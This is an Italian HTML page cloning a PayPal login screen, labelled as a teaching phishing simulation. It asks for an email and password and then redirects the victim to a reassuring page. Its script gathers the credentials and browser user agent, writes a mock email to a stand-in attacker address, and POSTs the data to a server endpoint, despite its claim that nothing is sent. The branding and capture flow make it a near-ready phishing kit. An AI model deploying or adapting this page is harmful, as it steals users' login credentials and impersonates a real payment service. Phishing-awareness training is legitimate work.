<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<title>Verifica account</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  background: #f3f4f6;
  font-family: "Arial", sans-serif;
}

/* Box di login */
.box {
  width: 380px;
  margin: 100px auto;
  background: #ffffff;
  padding: 32px;
  box-shadow: 0 2px 6px rgba(0,0,0,.2);
  border-radius: 8px;
}

/* Logo PayPal */
.logo {
  font-size: 20px;
  font-weight: 600;
  margin-bottom: 20px;
  text-align: center;
}

h2 {
  font-size: 24px;
  font-weight: 600;
  margin: 0 0 10px;
  text-align: center;
}

p {
  color: #444;
  font-size: 14px;
  text-align: center;
}

input {
  width: 100%;
  padding: 10px;
  margin-top: 16px;
  font-size: 15px;
  box-sizing: border-box;
  border: 1px solid #ddd;
  border-radius: 4px;
}

button {
  width: 100%;
  padding: 10px;
  margin-top: 20px;
  background: #0070ba; /* Colore blu di PayPal */
  color: #ffffff;
  border: none;
  font-size: 15px;
  cursor: pointer;
  border-radius: 4px;
}

button:hover {
  background: #005f97;
}

footer {
  text-align: center;
  margin-top: 20px;
  font-size: 12px;
  color: #888;
}

/* Vista didattica "attaccante" (opzionale per debugging) */
.attacker {
  width: 600px;
  margin: 60px auto;
  background: #111;
  color: #0f0;
  padding: 20px;
  font-family: monospace;
  border-radius: 6px;
}

.hidden {
  display: none;
}
</style>
</head>

<body>

<!-- VISTA UTENTE -->
<div class="box" id="loginBox">
  <div class="logo">
    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal" width="120">
  </div>

  <h2>Accedi al tuo account PayPal</h2>
  <p>Per continuare è richiesta la verifica dell’account.</p>

  <form onsubmit="simulateAttack(); return false;">
    <input type="email" id="email" placeholder="Email, telefono o Skype" required>
    <input type="password" id="password" placeholder="Password" required>
    <button type="submit">Avanti</button>
  </form>
  
  <footer>
    <p>© 2026 PayPal Inc. Tutti i diritti riservati.</p>
  </footer>
</div>

<script>
function simulateAttack() {
  const stolenData = {
    event: "credential_capture",
    email: document.getElementById("email").value,
    password: document.getElementById("password").value,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    note: "SIMULAZIONE DIDATTICA - nessun dato inviato"
  };

  // ===== SIMULAZIONE INVIO EMAIL (SOLO F12) =====
  const simulatedEmail = {
    protocol: "SMTP (simulated)",
    from: "phishing-kit@evil-domain.fake",
    to: "attacker@example.com",
    subject: "New credentials captured",
    body: {
      email: stolenData.email,
      password: stolenData.password,
      timestamp: stolenData.timestamp,
      userAgent: stolenData.userAgent
    }
  };

  // Visibile SOLO in DevTools → Console
  console.group("%c[PHISHING DEMO] Simulated email sent", "color:red;font-weight:bold;");
  console.log("SMTP payload:", simulatedEmail);
  console.log("Raw credentials:", stolenData);
  console.groupEnd();

  // (Opzionale) Richiesta fake visibile in Network
  fetch("/mail-collector-demo", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(simulatedEmail)
  });

  // Reindirizzamento rassicurante per l’utente
  setTimeout(() => {
    window.location.href = "verifica-completata1.html";
  }, 1500);
}
</script>

</body>
</html>
